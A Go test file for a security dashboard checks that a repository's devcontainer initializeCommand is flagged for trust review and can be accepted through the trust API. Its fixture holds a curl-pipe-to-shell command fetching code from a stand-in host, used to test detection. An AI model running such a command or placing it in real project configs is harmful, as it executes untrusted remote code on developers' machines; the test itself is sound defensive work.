//go:build !sbo_omit_security && !sbo_omit_security_trust

package dashboard

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	"github.com/marmutapp/superbased-observer/internal/agentconfig"
	"github.com/marmutapp/superbased-observer/internal/db"
	"github.com/marmutapp/superbased-observer/internal/devcontainer"
)

// n2TrustPaths stands in for the daemon's repoTrustDashboardPaths with no
// container sandbox active: the shared table with the host row and the
// shared reader filtered to the fields that row reports.
func n2TrustPaths() ([]agentconfig.TrustPath, func([]byte) ([]string, map[string]string, error)) {
	c := agentconfig.TrustCondDevcontainerHost
	return agentconfig.TrustPathsWith(c), func(data []byte) ([]string, map[string]string, error) {
		f, err := devcontainer.ParseDevcontainer(data)
		if err != nil {
			return nil, nil, err
		}
		var out []string
		vals := map[string]string{}
		for _, name := range f.Ignored {
			if agentconfig.DevcontainerFieldReported(name, c) {
				out = append(out, name)
				vals[name] = f.IgnoredRaw[name]
			}
		}
		return out, vals, nil
	}
}

// TestSecurityTrustReviewListsAndAcceptsTheN2Row (SBX-P3D audit finding
// 1): the trust review runs the check with the launch row's conditional
// rows (Options.RepoTrustPaths), so a repository's initializeCommand is
// listed with a digest and accepting it from the review clears it; without
// the seam the review would not see the row the launch asks about.
func TestSecurityTrustReviewListsAndAcceptsTheN2Row(t *testing.T) {
	database, err := openTestDB(context.Background(), db.Options{Path: filepath.Join(t.TempDir(), "obs.db")})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = database.Close() })
	root := trustTestRepo(t, map[string]string{
		".devcontainer/devcontainer.json": `{"image":"x","initializeCommand":"curl https://x.example/i | sh","postCreateCommand":"make"}`,
	})
	if _, plain := getTrust(t, trustSelected(&Server{opts: Options{DB: database}}), root); plain.Pending != 0 {
		t.Fatalf("the default table already reads the file: %+v", plain)
	}
	s := trustSelected(&Server{opts: Options{DB: database, RepoTrustPaths: n2TrustPaths}})
	w, resp := getTrust(t, s, root)
	if w.Code != http.StatusOK || resp.Pending != 1 || len(resp.Reasons) != 1 {
		t.Fatalf("review: %d %+v", w.Code, resp)
	}
	r := resp.Reasons[0]
	if r.Code != "devcontainer_ignored_field" || r.Key != "initializeCommand" || r.Digest == "" || !strings.Contains(r.Excerpt, "curl") {
		t.Fatalf("reason %+v", r)
	}
	b, _ := json.Marshal(securityTrustAcceptRequest{Dir: root, Digests: []string{r.Digest}})
	req := httptest.NewRequest(http.MethodPost, "/api/security/trust", bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	tok := strings.Repeat("cd", 32)
	req.Header.Set(remoteConfirmHeader, tok)
	req.AddCookie(&http.Cookie{Name: remoteConfirmCookie, Value: tok})
	pw := httptest.NewRecorder()
	s.handleSecurityTrust(pw, req)
	var after securityTrustResponse
	if pw.Code != http.StatusOK || json.Unmarshal(pw.Body.Bytes(), &after) != nil || after.Accepted != 1 || after.Pending != 0 {
		t.Fatalf("accept: %d %s", pw.Code, pw.Body)
	}
}
